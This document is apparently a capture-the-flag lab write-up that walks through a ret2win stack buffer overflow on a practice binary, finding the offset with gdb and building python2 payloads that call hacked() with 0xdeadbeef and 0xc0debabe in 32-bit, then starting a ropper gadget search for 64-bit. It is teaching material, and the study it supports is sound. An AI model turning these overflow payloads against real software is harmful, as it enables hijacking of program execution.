# Level 04

Moving on to level 04. There are two version and we will start with 32-bit. This level is the same as the last one, but the ```hacked()``` function has two parameters that we need to pass it in order for the call to work. Parameter passing works differently on 32-bit than 64-bit so this time, it actually matters what the binary is compiled as.

## 32-Bit

Looking in the directory, we see the following: ```exploit.py ret2win_params ret2win_params.c ropstar.py```. As always, lets run the binary, check the file type, and check and protections it has.

``` Bash
$ chmod +x ret2win_params
$ ./ret2win_params
Name:
test
Hi there, test

$ file ret2win_params
ret2win_params: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, BuildID[sha1]=57b54d38f04bf11e85baa1619dc95228d8fd14b1, for GNU/Linux 3.2.0, not stripped

$ checksec --file=ret2win_params
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable   FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               1             ret2win_params
```
Here, we see the binary runs the same as the last level, adn we can confirm that it is 32-bit. Lastly, there are no protections on the binary that we need to worry about.
Lets open ghidra and check out the new ```hacked()``` function and see what we need to do. The other two functions are the same from the last level so we don't need to worry about those

``` C
/* WARNING: Function: __x86.get_pc_thunk.ax replaced with injection: get_pc_thunk_ax */

void hacked(int first,int second)

{
  if ((first == 0xdeadbeef) && (second == 0xc0debabe)) {
    puts("This function is TOP SECRET! How did you get in here?! :O");
  }
  else {
    puts("Unauthorised access to secret function detected, authorities have been alerted!!");
  }
  return;
}
```
We see that the function takes in two ```int ``` parameters and then checks that the first one is equal to ```0xdeadbeef``` in hex and ```0xc0debabe``` in hex. So, we know that we need three things: To overwrite the return address to the ```hacked()``` function, set the variable ```first``` to ```0xdeadbeef```, and then set the variable ```second``` to ```0xc0debabe```.
Lets start by setting the return address to the ```hacked()``` function. First, we'll make our cyclic string and see where the return address is being stored

``` Bash
$ pwn cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```

Now we'll open gdb, set a breakpoint at the return address of ```register_name()``` and pass in that cyclic string for our name

``` Bash
gef➤  disas register_name
Dump of assembler code for function register_name:
   0x080491d5 <+0>:     push   ebp
   0x080491d6 <+1>:     mov    ebp,esp
   0x080491d8 <+3>:     push   ebx
   0x080491d9 <+4>:     sub    esp,0x14
   0x080491dc <+7>:     call   0x80490c0 <__x86.get_pc_thunk.bx>
   0x080491e1 <+12>:    add    ebx,0x2e1f
   0x080491e7 <+18>:    sub    esp,0xc
   0x080491ea <+21>:    lea    eax,[ebx-0x1f6b]
   0x080491f0 <+27>:    push   eax
   0x080491f1 <+28>:    call   0x8049040 <puts@plt>
   0x080491f6 <+33>:    add    esp,0x10
   0x080491f9 <+36>:    sub    esp,0x8
   0x080491fc <+39>:    lea    eax,[ebp-0x18]
   0x080491ff <+42>:    push   eax
   0x08049200 <+43>:    lea    eax,[ebx-0x1f65]
   0x08049206 <+49>:    push   eax
   0x08049207 <+50>:    call   0x8049060 <__isoc99_scanf@plt>
   0x0804920c <+55>:    add    esp,0x10
   0x0804920f <+58>:    sub    esp,0x8
   0x08049212 <+61>:    lea    eax,[ebp-0x18]
   0x08049215 <+64>:    push   eax
   0x08049216 <+65>:    lea    eax,[ebx-0x1f62]
   0x0804921c <+71>:    push   eax
   0x0804921d <+72>:    call   0x8049030 <printf@plt>
   0x08049222 <+77>:    add    esp,0x10
   0x08049225 <+80>:    nop
   0x08049226 <+81>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x08049229 <+84>:    leave  
   0x0804922a <+85>:    ret    
End of assembler dump.
gef➤  b *0x0804922a
Breakpoint 1 at 0x804922a
gef➤  r
Starting program: /home/vagrant/Desktop/practice/CTF/pwn/binary_exploitation_101/04-ret2win_with_params/32-bit/ret2win_params 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Name:
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Breakpoint 1, 0x0804922a in register_name ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf6c  →  "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x804922a  →  <register_name+85> ret 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf6c│+0x0000: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"    ← $esp
0xffffcf70│+0x0004: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0xffffcf74│+0x0008: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x000c: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x0010: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0014: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0018: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x001c: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049227 <register_name+82> pop    ebp
    0x8049228 <register_name+83> cld    
    0x8049229 <register_name+84> leave  
 →  0x804922a <register_name+85> ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804922a in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804922a → register_name()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────


[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf6c  →  "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x804922a  →  <register_name+85> ret 
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf6c│+0x0000: "haaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaata[...]"    ← $esp
0xffffcf70│+0x0004: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0xffffcf74│+0x0008: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x000c: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x0010: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0014: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0018: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x001c: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x8049227 <register_name+82> pop    ebp
    0x8049228 <register_name+83> cld    
    0x8049229 <register_name+84> leave  
 →  0x804922a <register_name+85> ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804922a in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804922a → register_name()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  ni
0x61616168 in ?? ()
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf70  →  "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf70│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"    ← $esp
0xffffcf74│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x0008: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x000c: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0010: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0014: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x0018: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf8c│+0x001c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x61616168 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────






[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x6f      
$ebx   : 0x61616166 ("faaa"?)
$ecx   : 0x0       
$edx   : 0xf7fc2540  →  0xf7fc2540  →  [loop detected]
$esp   : 0xffffcf70  →  "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
$ebp   : 0x61616167 ("gaaa"?)
$esi   : 0x8049250  →  <__libc_csu_init+0> push ebp
$edi   : 0xf7ffcb80  →  0x00000000
$eip   : 0x61616168 ("haaa"?)
$eflags: [zero carry PARITY adjust SIGN trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffcf70│+0x0000: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"    ← $esp
0xffffcf74│+0x0004: "jaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaava[...]"
0xffffcf78│+0x0008: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0xffffcf7c│+0x000c: "laaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxa[...]"
0xffffcf80│+0x0010: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0xffffcf84│+0x0014: "naaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf88│+0x0018: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0xffffcf8c│+0x001c: "paaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616168
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x61616168 in ?? (), reason: SINGLE STEP
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
Here, we see that after setting a breakpoint, running the program, entering our cyclic string, and entering ```ni``` to move to the next instruction, that ```$eip``` is set to ```haaa```. Running ```pwn cyclic -l haaa```, we see that the offset is ```28``` bytes.
Now, we need to set up our payload with 28 bytes of padding, then our return address, and then check where our parameters are being stored. Since 32-bit reads everything off the stack, we don't need to worry about putting the parameters in registers like 64-bit, we can simply put them on the stack by overwriting it.
To construct our payload, we need to find the ```hacked()``` address
``` Bash
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x08049000  _init
0x08049030  printf@plt
0x08049040  puts@plt
0x08049050  __libc_start_main@plt
0x08049060  __isoc99_scanf@plt
0x08049070  _start
0x080490b0  _dl_relocate_static_pie
0x080490c0  __x86.get_pc_thunk.bx
0x080490d0  deregister_tm_clones
0x08049110  register_tm_clones
0x08049150  __do_global_dtors_aux
0x08049180  frame_dummy
0x08049182  hacked
0x080491d5  register_name
0x0804922b  main
0x08049247  __x86.get_pc_thunk.ax
0x08049250  __libc_csu_init
0x080492b0  __libc_csu_fini
0x080492b1  __x86.get_pc_thunk.bp
0x080492b8  _fini
gef➤ 
```
Now we can construct our payload with the ```hacked()``` address.

``` Python
python2 -c 'print "a" * 28 + "\x82\x91\x04\x08" + "BBBB" + "CCCC" + "DDDD" + "EEEE"' > testPayload
```
This will allow us to return to the ```hacked()``` function, and then examine the stack to see which strings make it to our parameters.

``` Bash
 →  0x804922a <register_name+85> ret    
   ↳   0x8049182 <hacked+0>       push   ebp
       0x8049183 <hacked+1>       mov    ebp, esp
       0x8049185 <hacked+3>       push   ebx
       0x8049186 <hacked+4>       sub    esp, 0x4
       0x8049189 <hacked+7>       call   0x8049247 <__x86.get_pc_thunk.ax>
       0x804918e <hacked+12>      add    eax, 0x2e72
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804922a in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804922a → register_name()
[#1] 0x8049182 → frame_dummy()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
Here, we can see that we have successfully overwritten the return address and will return execution to the hacked function, not we need to set a breakpoint at first the compare instruction in hacked to examine memory at that point.

``` Bash
gef➤  disas hacked
Dump of assembler code for function hacked:
   0x08049182 <+0>:     push   ebp
   0x08049183 <+1>:     mov    ebp,esp
   0x08049185 <+3>:     push   ebx
   0x08049186 <+4>:     sub    esp,0x4
   0x08049189 <+7>:     call   0x8049247 <__x86.get_pc_thunk.ax>
   0x0804918e <+12>:    add    eax,0x2e72
   0x08049193 <+17>:    cmp    DWORD PTR [ebp+0x8],0xdeadbeef
   0x0804919a <+24>:    jne    0x80491bb <hacked+57>
   0x0804919c <+26>:    cmp    DWORD PTR [ebp+0xc],0xc0debabe
   0x080491a3 <+33>:    jne    0x80491bb <hacked+57>
   0x080491a5 <+35>:    sub    esp,0xc
   0x080491a8 <+38>:    lea    edx,[eax-0x1ff8]
   0x080491ae <+44>:    push   edx
   0x080491af <+45>:    mov    ebx,eax
   0x080491b1 <+47>:    call   0x8049040 <puts@plt>
   0x080491b6 <+52>:    add    esp,0x10
   0x080491b9 <+55>:    jmp    0x80491cf <hacked+77>
   0x080491bb <+57>:    sub    esp,0xc
   0x080491be <+60>:    lea    edx,[eax-0x1fbc]
   0x080491c4 <+66>:    push   edx
   0x080491c5 <+67>:    mov    ebx,eax
   0x080491c7 <+69>:    call   0x8049040 <puts@plt>
   0x080491cc <+74>:    add    esp,0x10
   0x080491cf <+77>:    nop
   0x080491d0 <+78>:    mov    ebx,DWORD PTR [ebp-0x4]
   0x080491d3 <+81>:    leave  
   0x080491d4 <+82>:    ret    
End of assembler dump.
gef➤  b *0x08049193
Breakpoint 2 at 0x8049193
gef➤  c
Continuing.
```
This will run the program to the breakpoint that we set. We can see that at the first compare instruction, we are comparing ```$ebp + 0x8``` to ```0xdeadbeef```. This means that the ```first``` variable is being pulled from that location on the stack. Lets examine what it currently is by running

``` Bash
gef➤  x $ebp + 0x8
0xffffcf74:     0x43434343
```
If we run ```pwn unhex 43434343``` we see that the string is ```CCCC```. This means that ```first``` is currently ```CCC``` so in our payload, we need to replace ```CCCC``` with ```0xdeadbeef```. Lets add that to our payload so we can pass this comparison and check the ```second``` variable.

``` Python
python2 -c 'print "a" * 28 + "\x82\x91\x04\x08" + "BBBB" + "\xef\xbe\xad\xde" + "DDDD" + "EEEE"' > testPayload
```
Now, lets do the same thing in gdb to check the ```second``` variable since we should now pass the first check.

``` Bash
 →  0x804919c <hacked+26>      cmp    DWORD PTR [ebp+0xc], 0xc0debabe
    0x80491a3 <hacked+33>      jne    0x80491bb <hacked+57>
    0x80491a5 <hacked+35>      sub    esp, 0xc
    0x80491a8 <hacked+38>      lea    edx, [eax-0x1ff8]
    0x80491ae <hacked+44>      push   edx
    0x80491af <hacked+45>      mov    ebx, eax
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x804919c in hacked (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x804919c → hacked()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  x $ebp + 0xc
0xffffcf78:     0x44444444
gef➤
```
I put a breakpoint at the second compare instruction and then examined the memory that it was comparing to ```0xc0debabe```. If we run ```pwn unhex 44444444``` we see the string is ```DDDD```. All we need to do now is put ```0xc0debabe``` in the ```DDDD``` section of our payload

``` Python
python2 -c 'print "a" * 28 + "\x82\x91\x04\x08" + "BBBB" + "\xef\xbe\xad\xde" + "\xbe\xba\xde\xc0"' > testPayload
```
Now, we can simply run ```./ret2win_params < testPayload``` and we should see the following output
``` Bash
Name:
Hi there, aaaaaaaaaaaaaaaaaaaaaaaaaaaa�BBBBﾭ޾���
This function is TOP SECRET! How did you get in here?! :O
zsh: segmentation fault  ./ret2win_params < testPayload
```
Awesome, we did it! We were able to call ```hacked()``` and pass it the correct parameters in the correct order! You may be wondering though what the ```BBBB``` stands for in our payload? 
That is the return address for the ```hacked()``` function. This is where the ```hacked()``` function will return to when it finishes execution.


## 64-Bit

64-bit is a similar thought process but vastly different in terms of passing the parameters to ```hacked()```. We can start out the same way by creating a long cyclic string and finding where our return address should go. We will then dive into the 64-bit world from there!

We set a breakpoint at the end of the ```register_name()``` function and then ran the program passing in our cyclic string. We ran ni to load the registers for the next instruction and this is what it looks like on gdb

``` Bash
$rax   : 0xa1              
$rbx   : 0x007fffffffdea8  →  0x007fffffffe1f4  →  "/home/vagrant/Desktop/practice/CTF/pwn/binary_expl[...]"
$rcx   : 0x0               
$rdx   : 0x0               
$rsp   : 0x007fffffffdd88  →  "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"
$rbp   : 0x6161616661616165 ("eaaafaaa"?)
$rsi   : 0x000000004052a0  →  "Hi there, aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaa[...]"
$rdi   : 0x007fffffffd810  →  0x007ffff7e1ee70  →  <funlockfile+0> mov rdi, QWORD PTR [rdi+0x88]
$rip   : 0x000000004011d6  →  <register_name+70> ret 
$r8    : 0x1c0             
$r9    : 0x73              
$r10   : 0x0               
$r11   : 0x202             
$r12   : 0x0               
$r13   : 0x007fffffffdeb8  →  0x007fffffffe260  →  "COLORFGBG=15;0"
$r14   : 0x0               
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x007fffffffdd88│+0x0000: "gaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasa[...]"      ← $rsp
0x007fffffffdd90│+0x0008: "iaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaaua[...]"
0x007fffffffdd98│+0x0010: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
0x007fffffffdda0│+0x0018: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x007fffffffdda8│+0x0020: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabba[...]"
0x007fffffffddb0│+0x0028: "qaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabda[...]"
0x007fffffffddb8│+0x0030: "saaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfa[...]"
0x007fffffffddc0│+0x0038: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x4011cf <register_name+63> call   0x401040 <printf@plt>
     0x4011d4 <register_name+68> nop    
     0x4011d5 <register_name+69> leave  
 →   0x4011d6 <register_name+70> ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x4011d6 in register_name (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011d6 → register_name()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤ 
```
This is where we run into one of the first main differences of 64-bit. In 32-bit we were able to look right at ```$eip``` to see what address or value was being stored there. Here however, we see that ```$rip``` (64-bit equivalent) does not show that information. This is becuase in 64-bit the return address is ```$rsp```. 
We see that the string stored in ```$rsp``` begins with ```gaaa```. This is where our return address is stored and then moved to ```$eip``` once it is known to be an accurate address (not "gaaa"). 
This tells us that ```gaaa``` is our offset and where our return address needs to go. Lets figure out the bytes for that

``` Bash
$ pwn cyclic -l gaaa
24
```
Lets also get the address for our hacked function

``` Bash
gef➤  info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  printf@plt
0x0000000000401050  __isoc99_scanf@plt
0x0000000000401060  _start
0x0000000000401090  _dl_relocate_static_pie
0x00000000004010a0  deregister_tm_clones
0x00000000004010d0  register_tm_clones
0x0000000000401110  __do_global_dtors_aux
0x0000000000401140  frame_dummy
0x0000000000401142  hacked
0x0000000000401190  register_name
0x00000000004011d7  main
0x00000000004011f0  __libc_csu_init
0x0000000000401250  __libc_csu_fini
0x0000000000401254  _fini
gef➤ 
```
We see that the address for ```hacked()``` is ```0x0000000000401142```. Lets build out our basic payload

``` Python
python2 -c ' print "a" * 24 + "\x42\x11\x40\x00\x00\x00\x00\x00"' > myPayload
```
Now we can run the program with this payload and get the following in gdb

``` Bash
 →   0x4011d6 <register_name+70> ret    
   ↳    0x401142 <hacked+0>       push   rbp
        0x401143 <hacked+1>       mov    rbp, rsp
        0x401146 <hacked+4>       sub    rsp, 0x10
        0x40114a <hacked+8>       mov    QWORD PTR [rbp-0x8], rdi
        0x40114e <hacked+12>      mov    QWORD PTR [rbp-0x10], rsi
        0x401152 <hacked+16>      movabs rax, 0xdeadbeefdeadbeef
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "ret2win_params", stopped 0x4011d6 in register_name (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x4011d6 → register_name()
[#1] 0x401142 → frame_dummy()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤
```
We can see that we got into the hacked function with that address. Now lets look at the dissambly of the ```hacked()``` function to see whats going on:

``` Bash
gef➤  disas hacked
Dump of assembler code for function hacked:
   0x0000000000401142 <+0>:     push   rbp
   0x0000000000401143 <+1>:     mov    rbp,rsp
   0x0000000000401146 <+4>:     sub    rsp,0x10
   0x000000000040114a <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x000000000040114e <+12>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401152 <+16>:    movabs rax,0xdeadbeefdeadbeef
   0x000000000040115c <+26>:    cmp    QWORD PTR [rbp-0x8],rax
   0x0000000000401160 <+30>:    jne    0x401180 <hacked+62>
   0x0000000000401162 <+32>:    movabs rax,0xc0debabec0debabe
   0x000000000040116c <+42>:    cmp    QWORD PTR [rbp-0x10],rax
   0x0000000000401170 <+46>:    jne    0x401180 <hacked+62>
   0x0000000000401172 <+48>:    lea    rdi,[rip+0xe8f]        # 0x402008
   0x0000000000401179 <+55>:    call   0x401030 <puts@plt>
   0x000000000040117e <+60>:    jmp    0x40118d <hacked+75>
   0x0000000000401180 <+62>:    lea    rdi,[rip+0xec1]        # 0x402048
   0x0000000000401187 <+69>:    call   0x401030 <puts@plt>
   0x000000000040118c <+74>:    nop
   0x000000000040118d <+75>:    nop
   0x000000000040118e <+76>:    leave  
   0x000000000040118f <+77>:    ret    
End of assembler dump.
gef➤
```
This is where more differences come in between 32 and 64 bit. Part way down in the dissasembly, we see the following lines

``` Bash
   0x000000000040114a <+8>:     mov    QWORD PTR [rbp-0x8],rdi
   0x000000000040114e <+12>:    mov    QWORD PTR [rbp-0x10],rsi
   0x0000000000401152 <+16>:    movabs rax,0xdeadbeefdeadbeef
   0x000000000040115c <+26>:    cmp    QWORD PTR [rbp-0x8],rax
   0x0000000000401160 <+30>:    jne    0x401180 <hacked+62>
   0x0000000000401162 <+32>:    movabs rax,0xc0debabec0debabe
   0x000000000040116c <+42>:    cmp    QWORD PTR [rbp-0x10],rax
   0x0000000000401170 <+46>:    jne    0x401180 <hacked+62>
```
It looks like registers ```$rdi, $rsi``` are being moved onto the stack at ```$rbp-0x8, $rbp-0x10``` respectively. Then the hex value ```0xdeadbeefdeadbeef``` is being moved into register ```$rax``` and then the stack position of the first parameter (```$rbp-0x8```) is being compared to ```$rax```.
What does this tell us? This tells us that we can't simply push these parameters onto the stack like we did in 32-bit becuase they will just be overwritten by the contents of the registers. We need to actually store these values in the registers themselves.
This is much more difficult problem and in order to solve it, we need to use a new tool called ```ropper```. ```Ropper``` allows us to search through the binary file and find gadgets. Gadgets essentially are functions within the binary that we can use, primarily to do exactly this, access and modify registers. 
Lets run it and see what we are dealing with

``` Bash
$ropper --file ret2win_params
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%



Gadgets
=======


0x0000000000401081: adc dword ptr [rax], eax; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040107a: adc dword ptr [rax], eax; mov rdi, 0x4011d7; call qword ptr [rip + 0x2f66]; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010ee: adc dword ptr [rax], edi; test rax, rax; je 0x1100; mov edi, 0x404040; jmp rax; 
0x0000000000401085: adc eax, 0x2f66; hlt; nop dword ptr [rax + rax]; ret; 
0x00000000004010ac: adc edi, dword ptr [rax]; test rax, rax; je 0x10c0; mov edi, 0x404040; jmp rax; 
0x0000000000401089: add ah, dh; nop dword ptr [rax + rax]; ret; 
0x0000000000401083: add bh, bh; adc eax, 0x2f66; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040100a: add byte ptr [rax - 0x7b], cl; sal byte ptr [rdx + rax - 1], 0xd0; add rsp, 8; ret; 
0x00000000004011cb: add byte ptr [rax], al; add byte ptr [rax], al; call 0x1040; nop; leave; ret; 
0x00000000004011dc: add byte ptr [rax], al; add byte ptr [rax], al; call 0x1190; mov eax, 0; pop rbp; ret; 
